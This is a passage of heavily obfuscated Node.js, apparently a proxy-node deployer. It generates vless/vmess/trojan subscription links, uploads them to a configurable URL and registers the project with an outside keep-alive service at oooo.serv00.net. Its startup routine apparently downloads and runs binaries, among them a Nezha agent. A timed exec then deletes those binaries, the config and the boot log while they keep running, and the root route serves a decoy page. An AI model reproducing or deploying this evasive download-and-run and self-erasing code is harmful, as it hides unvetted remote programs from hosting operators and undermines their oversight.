_0x1330bd=_0x2509,_0x43d584={'v':'2','ps':''+_0x12f609,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1330bd(0x20e),'net':'ws','type':'none','host':_0x41f492,'path':_0x1330bd(_0x4bf717._0x3f250a),'tls':'tls','sni':_0x41f492,'alpn':'','fp':_0x1330bd(_0x4bf717._0x26cf49)},_0x245fb4=_0x1330bd(_0x4bf717._0x235d28)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x41f492+_0x1330bd(0x1be)+_0x41f492+_0x1330bd(0x1c7)+_0x12f609+_0x1330bd(0x206)+Buffer[_0x1330bd(_0x4bf717._0x4e463b)](JSON[_0x1330bd(0x204)](_0x43d584))[_0x1330bd(_0x4bf717._0x492abb)](_0x1330bd(_0x4bf717._0x349168))+_0x1330bd(0x1c0)+UUID+'@'+CFIP+':'+CFPORT+_0x1330bd(_0x4bf717._0x44b437)+_0x41f492+_0x1330bd(_0x4bf717._0x526247)+_0x41f492+_0x1330bd(_0x4bf717._0x1f1a82)+_0x12f609+_0x1330bd(_0x4bf717._0x402e27);console[_0x1330bd(_0x4bf717._0x2057ab)](Buffer['from'](_0x245fb4)[_0x1330bd(0x201)](_0x1330bd(0x1f2))),fs['writeFileSync'](subPath,Buffer[_0x1330bd(0x22e)](_0x245fb4)['toString'](_0x1330bd(0x1f2))),console[_0x1330bd(_0x4bf717._0x2057ab)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x1330bd(0x205)]('/'+SUB_PATH,(_0x421a58,_0x343b60)=>{const _0x374053=_0x1330bd,_0x67db0d=Buffer[_0x374053(0x22e)](_0x245fb4)[_0x374053(0x201)](_0x374053(0x1f2));_0x343b60[_0x374053(_0x1c50ab._0x10bc2a)](_0x374053(_0x1c50ab._0x5a08cf),_0x374053(0x23d)),_0x343b60['send'](_0x67db0d);}),_0x2684f7(_0x245fb4);},0x7d0);});}}async function uploadNodes(){const _0x231c41={_0x1965b5:0x22c,_0x4f19f5:0x202,_0xcbb0be:0x22a,_0x5831f1:0x217},_0x54c46c=_0x136757;if(UPLOAD_URL&&PROJECT_URL){const _0xc94219=PROJECT_URL+'/'+SUB_PATH,_0x3cf7eb={'subscription':[_0xc94219]};try{const _0x56149b=await axios[_0x54c46c(_0x231c41._0x1965b5)](UPLOAD_URL+_0x54c46c(_0x231c41._0x4f19f5),_0x3cf7eb,{'headers':{'Content-Type':_0x54c46c(0x1fe)}});return _0x56149b&&_0x56149b[_0x54c46c(0x1f3)]===0xc8?(console[_0x54c46c(0x217)](_0x54c46c(0x213)),_0x56149b):null;}catch(_0x4fd75f){if(_0x4fd75f['response']){if(_0x4fd75f[_0x54c46c(0x1dc)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x51e0a4=fs[_0x54c46c(0x208)](listPath,'utf-8'),_0x2a651e=_0x51e0a4[_0x54c46c(0x21b)]('\x0a')[_0x54c46c(0x193)](_0x5e9b07=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x54c46c(0x1b6)](_0x5e9b07));if(_0x2a651e['length']===0x0)return;const _0x3507ef=JSON[_0x54c46c(0x204)]({'nodes':_0x2a651e});try{const _0x3beaab=await axios[_0x54c46c(_0x231c41._0x1965b5)](UPLOAD_URL+_0x54c46c(_0x231c41._0xcbb0be),_0x3507ef,{'headers':{'Content-Type':'application/json'}});return _0x3beaab&&_0x3beaab['status']===0xc8?(console[_0x54c46c(_0x231c41._0x5831f1)](_0x54c46c(0x1dd)),_0x3beaab):null;}catch(_0x1b52f1){return null;}}else return;}}function cleanFiles(){const _0x561be3={_0x4766c8:0x19a,_0xc990af:0x1b5,_0x2b5cdb:0x1fb,_0x2702ea:0x220},_0x526c48={_0x1e3fcf:0x241,_0x4a9f96:0x217},_0x216dac={_0x106291:0x217};setTimeout(()=>{const _0x4d287a=_0x2509,_0x31dc96=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x31dc96[_0x4d287a(0x19a)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x31dc96[_0x4d287a(_0x561be3._0x4766c8)](phpPath);process[_0x4d287a(_0x561be3._0xc990af)]===_0x4d287a(0x1d7)?exec(_0x4d287a(0x1e6)+_0x31dc96[_0x4d287a(0x1fb)]('\x20')+_0x4d287a(0x1a5),_0x13d13=>{const _0x1a64f3=_0x4d287a;console[_0x1a64f3(0x241)](),console[_0x1a64f3(_0x216dac._0x106291)](_0x1a64f3(0x1d9)),console['log'](_0x1a64f3(0x1eb));}):exec(_0x4d287a(0x23e)+_0x31dc96[_0x4d287a(_0x561be3._0x2b5cdb)]('\x20')+_0x4d287a(_0x561be3._0x2702ea),_0x43e6b4=>{const _0x59ed29=_0x4d287a;console[_0x59ed29(_0x526c48._0x1e3fcf)](),console['log']('App\x20is\x20running'),console[_0x59ed29(_0x526c48._0x4a9f96)](_0x59ed29(0x1eb));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3dda11={_0x116e9b:0x217,_0x48f1d9:0x22c},_0x2d3b7c=_0x136757;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2d3b7c(_0x3dda11._0x116e9b)](_0x2d3b7c(0x1df));return;}try{const _0x47e033=await axios[_0x2d3b7c(_0x3dda11._0x48f1d9)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2d3b7c(0x1fe)}});return console[_0x2d3b7c(0x217)](_0x2d3b7c(0x199)),_0x47e033;}catch(_0x15fd1e){return console['error'](_0x2d3b7c(0x212)+_0x15fd1e[_0x2d3b7c(0x1e5)]),null;}}async function startserver(){const _0x335d84=_0x136757;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x515ed5){console[_0x335d84(0x1b8)]('Error\x20in\x20startserver:',_0x515ed5);}}startserver()[_0x136757(0x1f1)](_0x2e1d13=>{const _0x40b434={_0x41b352:0x1b8,_0x2611aa:0x22f},_0xef3ec0=_0x136757;console[_0xef3ec0(_0x40b434._0x41b352)](_0xef3ec0(_0x40b434._0x2611aa),_0x2e1d13);}),app[_0x136757(0x205)]('/',async function(_0x17ce61,_0x4aac59){const _0x406056={_0x1f8619:0x24c,_0x1218a3:0x1d3},_0x16db39=_0x136757;try{const _0x11cc4d=path[_0x16db39(0x1fb)](__dirname,_0x16db39(_0x406056._0x1f8619)),_0x959fe4=await fs[_0x16db39(0x20b)]['readFile'](_0x11cc4d,_0x16db39(0x216));_0x4aac59[_0x16db39(0x218)](_0x959fe4);}catch(_0x224f8e){_0x4aac59['send'](_0x16db39(_0x406056._0x1218a3));}}),app['listen'](PORT,()=>console[_0x136757(0x217)](_0x136757(0x1a6)+PORT+'!'));
